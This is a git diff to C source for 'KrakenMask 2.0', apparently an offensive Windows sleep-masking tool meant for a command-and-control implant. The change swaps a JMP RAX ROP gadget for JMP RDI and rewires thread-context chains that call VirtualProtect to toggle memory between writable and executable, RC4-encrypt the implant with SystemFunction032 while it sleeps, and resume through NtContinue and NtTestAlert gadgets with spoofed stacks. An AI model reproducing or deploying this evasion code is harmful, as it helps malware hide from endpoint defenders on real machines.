@@ -26,7 +26,7 @@ LPVOID  lpGetGadgetlpNtTestAlert(
     _In_    LPVOID  lpModuleAddr
 );
 
-LPVOID lpGetGadgetJmpRax(
+LPVOID lpGetGadgetJmpRdi(
     _In_    LPVOID  lpModuleAddr
 );
 
@@ -36,10 +36,11 @@ VOID main()
     printf(" ____  __.              __                     _____                 __     ________     _______   \n");
     printf("|    |/ _|___________  |  | __ ____   ____    /     \\ _____    _____|  | __ \\_____  \\    \\   _  \\  \n");
     printf("|      < \\_  __ \\__  \\ |  |/ // __ \\ /    \\  /  \\ /  \\\\__  \\  /  ___/  |/ /  /  ____/    /  /_\\  \\ \n");
-    printf("|    |  \\ |  | \\/ __ \\|    <\\  ___/|   |  \\/    Y    \\/ __ \\_\\___ \\|    <  /       \\    \\  \\_/   \\\n");
+    printf("|    |  \\ |  | \\/ __  \\|    <\\  ___/|   |  \\/    Y    \\/ __ \\_\\___ \\|    <  /       \\    \\  \\_/   \\\n");
     printf("|____|__ \\|__|  (____  /__|_ \\\\___  >___|  /\\____|__  (____  /____  >__|_ \\ \\_______ \\ /\\ \\_____  /\n");
     printf("        \\/           \\/     \\/    \\/     \\/         \\/     \\/     \\/     \\/         \\/ \\/       \\/ \n");
-    printf("\tBy @RtlDallas, KrakenMask 2.0\n");
+    printf("\n\tBy @RtlDallas, KrakenMask 2.0\n");
+    printf("\tEdition : Cobalt l'AD REM sleep\n\n");
 
     while (TRUE)
     {
@@ -101,7 +102,7 @@ VOID KrakenSleep(
 
     // Solve gadget addr
     LPVOID  lpRetGadget             = lpGetGadgetlpNtTestAlert(lpNtdll);
-    LPVOID  lpJmpGadget             = lpGetGadgetJmpRax(lpKernel32);
+    LPVOID  lpJmpGadget             = lpGetGadgetJmpRdi(lpKernel32);
     LPVOID  lpNtContinueGadget      = (UINT_PTR)GetProcAddress(lpNtdll, "LdrInitializeThunk") + 19;
 
     if (!lpRetGadget || !lpJmpGadget || !lpNtContinueGadget)
@@ -158,13 +159,13 @@ VOID KrakenSleep(
         memcpy(&ctxEnd, &ctx, sizeof(CONTEXT));
 
         ctxSync.Rip = lpJmpGadget;
-        ctxSync.Rax = WaitForSingleObject;
+        ctxSync.Rdi = WaitForSingleObject;
         ctxSync.Rcx = hEventSync;
         ctxSync.Rdx = INFINITE;
         *(PULONG_PTR)ctxSync.Rsp = (ULONG_PTR)lpNtTestAlert;
 
         ctxRW.Rip = lpJmpGadget;
-        ctxRW.Rax = VirtualProtect;
+        ctxRW.Rdi = VirtualProtect;
         ctxRW.Rcx = lpAddr;
         ctxRW.Rdx = dwSize;
         ctxRW.R8 = PAGE_READWRITE;
@@ -172,25 +173,25 @@ VOID KrakenSleep(
         ctxRW.Rsp = lpFakeStackRW;
 
         ctxEnc.Rip = lpJmpGadget;
-        ctxEnc.Rax = lpSystemFunction032;
+        ctxEnc.Rdi = lpSystemFunction032;
         ctxEnc.Rcx = &uData;
         ctxEnc.Rdx = &uKey;
         *(PULONG_PTR)ctxEnc.Rsp = (ULONG_PTR)lpNtTestAlert;
 
         ctxDelay.Rip = lpJmpGadget;
-        ctxDelay.Rax = WaitForSingleObject;
+        ctxDelay.Rdi = WaitForSingleObject;
         ctxDelay.Rcx = (HANDLE)-1;
         ctxDelay.Rdx = dwSleepTime;
         *(PULONG_PTR)ctxDelay.Rsp = (ULONG_PTR)lpNtTestAlert;
 
         ctxDec.Rip = lpJmpGadget;
-        ctxDec.Rax = lpSystemFunction032;
+        ctxDec.Rdi = lpSystemFunction032;
         ctxDec.Rcx = &uData;
         ctxDec.Rdx = &uKey;
         *(PULONG_PTR)ctxDec.Rsp = (ULONG_PTR)lpNtTestAlert;
 
         ctxRWX.Rip = lpJmpGadget;
-        ctxRWX.Rax = VirtualProtect;
+        ctxRWX.Rdi = VirtualProtect;
         ctxRWX.Rcx = lpAddr;
         ctxRWX.Rdx = dwSize;
         ctxRWX.R8 = PAGE_EXECUTE_READWRITE;
@@ -198,12 +199,12 @@ VOID KrakenSleep(
         ctxRWX.Rsp = lpFakeStackRWX;
 
         ctxEvent.Rip = lpJmpGadget;
-        ctxEvent.Rax = SetEvent;
+        ctxEvent.Rdi = SetEvent;
         ctxEvent.Rcx = hEventEnd;
         *(PULONG_PTR)ctxEvent.Rsp = (ULONG_PTR)lpNtTestAlert;
 
         ctxEnd.Rip = lpJmpGadget;
-        ctxEnd.Rax = lpRtlExitUserThread;
+        ctxEnd.Rdi = lpRtlExitUserThread;
         ctxEnd.Rcx = 0;
         *(PULONG_PTR)ctxEnd.Rsp = (ULONG_PTR)lpNtTestAlert;
 
@@ -248,12 +249,12 @@ LPVOID  lpGetGadgetlpNtTestAlert(
     return NULL;
 }
 
-LPVOID lpGetGadgetJmpRax(
+LPVOID lpGetGadgetJmpRdi(
     _In_    LPVOID  lpModuleAddr
 )
 {
-    // pattern of "JMP RAX" gadget
-    BYTE pattern[] = { 0xFF, 0xE0 };
+    // pattern of "JMP RDI" gadget
+    BYTE pattern[] = { 0xFF, 0xE7 };
     for (SIZE_T i = 0; i < (MODULE_SIZE(lpModuleAddr) - 2); i++) {
         if (memcmp((PBYTE)lpModuleAddr + i, pattern, 2) == 0) {
             return (UINT_PTR)lpModuleAddr + i;
